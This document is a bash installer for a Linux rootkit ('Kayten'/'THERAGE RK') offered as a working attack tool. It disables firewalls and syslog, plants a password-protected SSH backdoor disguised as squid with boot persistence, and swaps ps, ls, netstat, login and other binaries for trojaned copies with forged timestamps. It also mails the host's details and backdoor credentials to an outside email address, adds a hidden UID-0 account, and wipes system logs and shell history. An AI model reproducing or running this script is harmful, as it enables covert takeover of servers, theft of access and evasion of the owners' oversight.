#!/bin/bash
#
#
#
#
#
#
#
# 
#
# USAGE:
# ./setup pass port
#
# SSHD backdoor: ssh -l root -p port hostname
#
#
#
#
#
#
# 

#
#

#

# Defines


# You dont need to edit anything below this
basedir=`pwd`

home="/usr/bin"
etc="/etc"
pico="/bin/pico"
wget="/usr/bin/wget"

# lets unzip our shit now
tar xfz bin.tgz
tar zxfv conf.tar.gz
rm -rf  conf.tar.gz
tar xfz lib.tgz
rm -rf bin.tgz  lib.tgz
tar xfz bin/ssh.tgz 
tar xfz bin/ssh-only.tgz
rm -rf ssh*.tgz
sleep 2 
cd $basedir

if [ "$(whoami)" != "root" ]; then
echo "${DCYN}[${WHI}sh${DCYN}] ${WHI} Try a new exploit :)))  ${RES}"
echo ""
exit
fi

BLK='[1;30m'
RED='[1;31m'
GRN='[1;32m'
YEL='[1;33m'
BLU='[1;34m'
MAG='[1;35m'
CYN='[1;36m'
WHI='[1;37m'
DRED='[0;31m'
DGRN='[0;32m'
DYEL='[0;33m'
DBLU='[0;34m'
DMAG='[0;35m'
DCYN='[0;36m'
DWHI='[0;37m'
RES='[0m'

if [ -f $wget ]; then
 echo "				${WHI}wget${RED} -> ${BLU}ok${RES}"
else
 tar -xzf wget.tgz
 mv -f wget $wget
echo "				${WHI}wget${RED} -> ${BLU}atasat${RES}"
 chmod +x $wget
fi

if [ -f $pico ]; then
 echo "				${WHI}pico${RED} -> ${BLU}ok${RES}"
else
 tar -xzf pico.tgz
 mv -f pico $pico
 echo "				${WHI}pico${RED} -> ${BLU}atasat${RES}"
chmod +x $pico
fi

if [ -f /etc/rc.d/init.d/ipchains ]; then
 /etc/rc.d/init.d/ipchains stop
fi
if [ -f /etc/rc.d/init.d/iptables ]; then
 /etc/rc.d/init.d/iptables stop
fi

echo "${WHI} @@@ ${GRN}LOGURII ${BLU}FILTRELE-)${GRN}ok ${BLU}!!!${WHI}@@@${RES}"

killall -9 syslogd

startime=`date +%S`
mv lib/* /lib/
chattr -isa /sbin/xlogin 2>/dev/null
chattr -isa /bin/login 2>/dev/null
mv /sbin/xlogin /bin/login 2>/dev/null

echo "${DCYN}[${WHI}sh${DCYN}]# ${GRN}Kayten ${BLU} Make some changes now 
wait 10sec  
THERAGE RK... ${RES}"
/sbin/ldconfig
echo "${DCYN}[${WHI}sh${GRN}]#Kayten ${BLU} checking files${RES}"
echo ""
echo ""
echo "${WHI}====================================================================${RES}"
echo ""
echo "${DCYN}                                                      "
echo "                                                             "
echo "                                                             "
echo " ${BLU}Kill Proced Terminated!Status: ${GRN}Object Killed !  "
echo "                                                             "
echo "                                                             "
echo "              ${BLU}Kayten ${GRN}Continuing ...              "
echo "                                                             "
echo "                                                             "
echo "                                                       ${RES}"
echo ""
echo "             ${DCYN}[${WHI}sh${GRN}]1st relase ${RES}"
echo ""
echo "${WHI}====================================================================${RES}"

echo "${DCYN}[${WHI}sh${BLU}]# Kayten ${GRN}started ${BLU}on ${WHI}`hostname -f`${RES}"

echo "${DCYN}[${WHI}sh${DCYN}]#                                                                  ${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]#                                                                  ${RES}"

if [ "`grep in.inetd /etc/rc.d/rc.sysinit`" ]; then

echo "${DCYN}[${WHI}sh${DCYN}]# [Alert] ${WHI}sh-kit probably installed on machine ${RED}[Alert] ${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]#                                         ${RES}"
chattr -AacdisSu /etc/ttyhash
rm -rf /etc/ttyhash
killall -9 nscd
killall -9 mountd
mv -f /sbin/xlogin /bin/login


else
echo "${DCYN}[${WHI}sh${DCYN}]#                                                                  ${RES}"
fi
SYSLOGCONF="/etc/syslog.conf"


echo -n "${DCYN}[${WHI}sh${GRN}]# checking ${BLU}for remote logging... ${RES}"

REMOTE=`grep -v "^#" "$SYSLOGCONF" | grep -v "^$" | grep "@" | cut -d '@' -f 2`

if [ ! -z "$REMOTE" ]; then
        echo "${DCYN}[${WHI}sh${DCYN}]# holy guacamole batman${RES}"
        echo
        echo '${RED}                      REMOTE LOGGING DETECTED ${RES}'
        echo '${DCYN}[${WHI}sh${DCYN}]#        I hope you can get to these other computer(s): ${RES}'
        echo
        for host in $REMOTE; do
                echo -n "            "
                echo $host
        done
        echo
        echo ' ${WHI}             cuz this box is LOGGING to it... ${RES}'
        echo
else
        echo "${DCYN}[${WHI}sh${GRN}]# guess not.${RES}"
fi

echo "${DCYN}[${WHI}sh${GRN}]# [Installing trojans....]                                  ${BLU}       ${RES}"
mkdir /lib/security 2>/dev/null
mkdir /lib/security/.config 2>/dev/null
mkdir /lib/security/.config/ssh 2>/dev/null

if test -n "$1" ; then
echo "${DCYN}[${WHI}sh${BLU}]#  Using Password : ${GRN}$1                                ${BLU}       ${RES}"
cd $basedir/bin
tar xfz $basedir/bin/ssh.tgz
chattr -AacdisSu /etc/ld.so.hash 2>/dev/null
chattr -AacdisSu /lib/libext-2.so.7 2>/dev/null
./pg $1 > /etc/ld.so.hash
chmod 777 /etc/ld.so.hash
cp -f /etc/ld.so.hash /lib/libext-2.so.7
chattr +ais /etc/ld.so.hash
chattr +ais /lib/libext-2.so.7
else
echo "${DCYN}[${WHI}sh${DCYN}]# ${WHI} No Password Specified, using default - $dpass           ${BLU}       ${RES}"
chattr -AacdisSu /etc/ld.so.hash 2>/dev/null
chattr -AacdisSu /lib/libext-2.so.7 2>/dev/null
./pg $dpass > /etc/ld.so.hash
chmod 777 /etc/ld.so.hash
cp -f /etc/ld.so.hash /lib/libext-2.so.7
chattr +ais /etc/ld.so.hash
chattr +ais /lib/libext-2.so.7
fi

if test -n "$2" ; then
echo "${DCYN}[${WHI}sh${BLU}]#         Using ssh-port : ${GRN}$2                                 ${RES}"
echo "Port $2" >> $basedir/bin/.sh/sshd_config
echo "3 $2" >> $basedir/conf/hosts.h
echo "4 $2" >> $basedir/conf/hosts.h

cat $basedir/bin/.sh/shdcf2 >> $basedir/bin/.sh/sshd_config ; rm -rf $basedir/bin/.sh/shdcf2
else
echo "${DCYN}[${WHI}sh${DCYN}]# No ssh-port Specified, using default - $dport             ${BLU}       ${RES}"
echo "Port $dport" >> $basedir/bin/.sh/sshd_config
echo "3 $2" >> $basedir/conf/hosts.h
echo "4 $2" >> $basedir/conf/hosts.h
cat $basedir/bin/.sh/shdcf2 >> $basedir/bin/.sh/sshd_config ; rm -rf $basedir/bin/.sh/shdcf2
fi

cd $basedir
mv $basedir/conf/lidps1.so /lib/lidps1.so
mv $basedir/conf/*  /usr/include/

# Ok lets start creating dirs
mkdir -p /lib/ldd.so/
cd $basedir/bin
mv .sh/* /lib/security/.config/ssh/
chattr -AacdisSu /usr/sbin/squid 2>/dev/null
cp /lib/security/.config/ssh/sshd /usr/sbin/squid
mv /lib/security/.config/ssh/sshd /lib/security/.config/
chmod 755 /usr/sbin/squid
/usr/sbin/squid -q
chattr +isa /usr/sbin/squid
echo "# Xntps (NTPv3 daemon) startup.." >> /etc/rc.d/rc.sysinit
echo "/usr/sbin/squid -q" >> /etc/rc.d/rc.sysinit
chattr +is /etc/rc.d/rc.sysinit

# Say hello to md5sum fixer boys n gurls !

/usr/bin/md5sum /sbin/ifconfig >> .shmd5
/usr/bin/md5sum /bin/ps >> .shmd5
/usr/bin/md5sum /bin/ls >> .shmd5
/usr/bin/md5sum /bin/netstat >> .shmd5
/usr/bin/md5sum /usr/bin/find >> .shmd5
/usr/bin/md5sum /usr/bin/top >> .shmd5
/usr/bin/md5sum /usr/sbin/lsof >> .shmd5
/usr/bin/md5sum /usr/bin/slocate >> .shmd5
/usr/bin/md5sum /usr/bin/dir >> .shmd5
/usr/bin/md5sum /usr/bin/md5sum >> .shmd5
/usr/bin/md5sum /bin/login >> .shmd5

./sysinfo > informatii ;./mail >/dev/null 2>&1
echo "            ${RED}kayten ${BLU}sending ${GRN}mail 1min pls${RES}"
cat informatii|mail -s "kayten root delivery" kaytgz@yahoo.com

echo "                ${RED}Mail ${BLU}sent ${GRN}kayten@cyberspace.org${RES}"

./encrypt -e .shmd5 /dev/srd0
rm -rf .shmd5


# leet ssh login / pass logger
# enable if u want

# tar xfz ssh-only.tgz
# sdd=`which ssh`

# if [ -f /usr/local/bin/ssh1 ] ;
# then
# echo "${DCYN}[${WHI}sh${DCYN}]# ssh1 detected in ${RED}/usr/local/bin/ssh1${BLU}, backdoored your sh'ness  ${RES}"
# touch -acmr /usr/local/bin/ssh1 ssh
# mv -f ssh /usr/local/bin/ssh1
# else
# echo "${DCYN}[${WHI}sh${DCYN}]# ssh detected in ${RED}$sdd${BLU}, backdoored your sh'ness ${RES}"
# touch -acmr $sdd ssh
# mv -f ssh $sdd
# fi



# time change bitch

touch -acmr /sbin/ifconfig ifconfig
touch -acmr /bin/ps ps
touch -acmr /bin/ls ls
touch -acmr /bin/login login
touch -acmr /bin/netstat netstat
touch -acmr /usr/bin/find find
touch -acmr /usr/bin/top top
touch -acmr /usr/sbin/lsof lsof
touch -acmr /sbin/syslogd syslogd
touch -acmr /usr/bin/slocate slocate
touch -acmr /usr/bin/dir dir
touch -acmr /usr/bin/md5sum md5sum
touch -acmr /usr/bin/pstree pstree


# Backdoor ps/top/du/ls/netstat/etc..
./sz /bin/login login
cd $basedir/bin

chattr -AacdisSu /bin/ps
mv -f ps /bin/ps
chattr +AacdisSu /bin/ps
chattr -AacdisSu /sbin/ifconfig
mv -f ifconfig /sbin/ifconfig
chattr +AacdisSu /sbin/ifconfig
chattr -AacdisSu /bin/netstat
mv -f netstat /bin/netstat
chattr +AacdisSu /bin/netstat
chattr -AacdisSu /usr/bin/top
mv -f top /usr/bin/top
chattr +AacdisSu /usr/bin/top
chattr -AacdisSu /usr/bin/slocate
mv -f slocate /usr/bin/slocate
chattr +AacdisSu /usr/bin/slocate
chattr -AacdisSu /bin/login
mv -f /bin/login /bin/xlogin
mv -f login /bin/login
chattr +AacdisSu /bin/login
chattr -AacdisSu /bin/ls
mv -f ls /bin/ls
chattr +AacdisSu /bin/ls
chattr -AacdisSu /usr/bin/find
mv -f find /usr/bin/find
chattr +AacdisSu /usr/bin/find
chattr -AacdisSu /usr/bin/dir
mv -f dir /usr/bin/dir
chattr +isa /usr/bin/dir
chattr -AacdisSu /usr/sbin/lsof
mv -f lsof /usr/sbin/lsof
chattr +isa /usr/sbin/lsof
mv -f md5sum /usr/bin/md5sum
mv -f syslogd /sbin/syslogd	
mv -f pstree /usr/bin/pstree

echo "${DCYN}[${WHI}sh${BLU}]#          : ps/du/ls/top/netstat/find ${GRN}backdoored             ${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]#                                                                  ${RES}"
echo "${DCYN}[${WHI}sh${GRN}]# [Moving our files...]                                            ${RES}"

mv $basedir/bin/tks /lib/ldd.so/tks
mv $basedir/bin/tkp /lib/ldd.so/tkp
mv $basedir/bin/tksb /lib/ldd.so/tksb
echo "${DCYN}[${WHI}sh${BLU}]#          : sniff/parse/sauber ${GRN}moved                      ${RES}"
echo "${DCYN}[${WHI}sh${GRN}]# [Modifying system settings to suite our needs]                    ${RES}"



if [ -f /lib/libncurses.so.5 ] ; then echo "" 
else
ln -s /lib/libncurses.so.4 /lib/libncurses.so.5 2>/dev/null
fi

echo "${WHI}--------------------------------------------------------------------${RES}"

echo "${DCYN}[${WHI}sh${GRN}]# [System Information...]${RES}"
MYIPADDR=`/sbin/ifconfig eth0 | grep "inet addr:" | \
awk -F ' ' ' {print $2} ' | cut -c6-`
echo "${DCYN}[${WHI}sh${GRN}]# Hostname :${WHI} `hostname -f` ($MYIPADDR)${RES}"
uname -a | awk '{ print  $11 }' >/tmp/info_tmp
echo "${DCYN}[${WHI}sh${BLU}]# Arch : ${WHI}`cat /tmp/info_tmp` -+- bogomips 
: `cat /proc/cpuinfo | grep bogomips | awk ' {print $3}'` '${RES}"
echo "${DCYN}[${WHI}sh${GRN}]# Alternative IP :${WHI} "`hostname -i`" -+-  Might be ["`/sbin/ifconfig | grep \eth | wc -l`" ] active adapters.${RES}"
if [ -f /etc/redhat-release ]; then
echo -n "${DCYN}[${WHI}sh${BLU}]# Distribution:${WHI} `head -1 /etc/redhat-release`${RES}"
else
echo -n "${DCYN}[${WHI}sh${BLU}]# Distribution:${WHI} unknown${RES}"
fi
rm -rf /tmp/info_tmp
echo "$1:$2:`hostname -f`:$MYIPADDR:$dport" | mail $md5sum
endtime=`date +%S`
total=`expr $endtime - $startime`

echo ""
echo "${WHI}--------------------------------------------------------------------${RES}"
echo "${DCYN}[${WHI}sh${DCYN}]# ipchains ...?${RES}"
/sbin/ipchains -L input | head -5
echo "${WHI}--------------------------------------------------------------------${RES}"

echo "${DCYN}[${WHI}sh${DCYN}]# ============================== ${GRN}Backdooring completed in :$total seconds ${RES}"
cd $basedir
cd ../
rm -rf savage*/ savage-v1*.tgz
if [ -f /usr/sbin/syslogd ] ; then
/usr/sbin/syslogd -m 0
else
/sbin/syslogd -m 0
fi


if [ -f /usr/sbin/inetd ] ; 
then
killall inetd
/usr/sbin/inetd
else
killall -9 xinetd
/usr/sbin/xinetd -reuse -pidfile /var/run/xinetd.pid
fi

if [ -f /etc/rc.d/init.d/ipchains ]; then
 /etc/rc.d/init.d/ipchains save
fi
if [ -f /etc/rc.d/init.d/iptables ]; then
 /etc/rc.d/init.d/iptables save
fi

/usr/sbin/adduser -o -g 0 -u 0 newss
rm -rf /home/newss

killall -9 mech
killall -9 psybnc
echo > /var/log/messages
echo > /var/log/secure
echo > /var/log/spooler
echo > /var/log/maillog
echo > /var/log/cron
echo > /var/log/wtmp
killall -HUP syslogd
unset HISTFILE
unset HISTSAVE

echo "${RED}syslog ${GRN}ok ${RED}portmap ${GRN}ok ${RED}ipchains ${GRN}ok ${RED}iptables ${GRN}ok ${RED}user ${GRN}ok{RES}"

echo "${WHI}@@@ ${BLU}Kayten ${GRN}OUT ${BLU}YOU ${BLU}ARE ${GRN}IN ${RED}Enjoy ${WHI}@@@${RES}"

cd ..

rm -rf ...

